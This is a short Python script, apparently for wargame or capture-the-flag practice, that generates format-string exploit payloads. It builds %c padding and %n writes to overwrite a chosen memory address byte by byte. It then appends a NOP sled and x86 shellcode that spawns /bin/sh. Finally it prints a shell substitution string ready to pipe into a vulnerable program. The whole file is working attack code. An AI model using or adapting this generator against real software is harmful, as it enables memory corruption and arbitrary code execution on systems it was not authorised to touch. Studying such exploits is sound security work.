#!/usr/bin/python3

'''
Format string generator
'''
import struct
import sys

counter = 0

where = int(sys.argv[1], 16)
to_write = int(sys.argv[2], 16)
start = int(sys.argv[3])
padding = int(sys.argv[4])


blac = b'%c'
stuff = b'AAAA'

stack = bytearray()
formt = bytearray()
garbage = bytearray()
shell = b"\x90" * 200 + b"\x68\x2f\x73\x68\x11\x68\x2f\x62\x69\x6e\x89\xe3\x31\xd2\x52\x53\x89\xe1\x88\x53\x07\x31\xc0\xb0\x0b\xcd\x80"

formt.extend(blac * (start // 4))
print_start = start // 4

if start % 4 != 0:
    print_start += start % 4
    stack.extend(b'.' * start)
    start = (start // 4 + 1) * 4

counter = print_start + 8 * 4

# TODO Optimization:
#  * Null bytes check
#  * Spurious format char '%' check
#  * If nval > 0xff, next step checks if the correct value is already written!

for i in range(0, 4):
    nval = to_write & 0xff
    while counter > nval:
        nval += 0x100

    if counter != nval:
        s = str(nval - counter)
        s = '%{0}c'.format(s).encode('ascii')
        formt.extend(s)
        counter += nval - counter
        # Write the stuff to be eventually written
        stack.extend(stuff)
    else:
        garbage.extend(b'....')

    # write the address
    stack.extend(struct.pack('I', where))
    # Write the %nval
    formt.extend(b'%n')

    # Next address
    to_write = to_write >> 8
    # New address
    where += 1

total = bytearray(stack)
total.extend(garbage)
total.extend(formt)
total.extend(shell)

if len(total) > padding:
    sys.stderr.write('Warning: len {0}\n'.format(len(total)))
extra = padding - len(total)

sss = ''
for e in total:
    if e >= 32 and e <= 126:
        sss += chr(e)
    else:
        sss += '\\x{:02x}'.format(e)

sys.stdout.write('$(python -c \'print "{0}" + "A"*{1}\')'.format(sss, extra))
